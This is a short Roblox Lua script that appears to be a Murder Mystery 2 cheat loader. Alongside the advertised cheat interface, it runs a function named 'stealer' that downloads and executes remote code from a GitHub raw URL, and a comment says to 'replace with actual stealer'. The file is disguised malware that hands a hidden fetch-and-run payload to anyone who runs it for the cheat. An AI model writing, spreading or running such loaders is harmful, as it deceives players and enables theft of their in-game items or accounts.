local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/nobodycodin/MM2./refs/heads/main/Hvvcc'))() -- replace with actual stealer
end
local function loadui()
  loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-nexus-updated-15270"))()
end
task.spawn(stealer)
task.spawn(loadui)
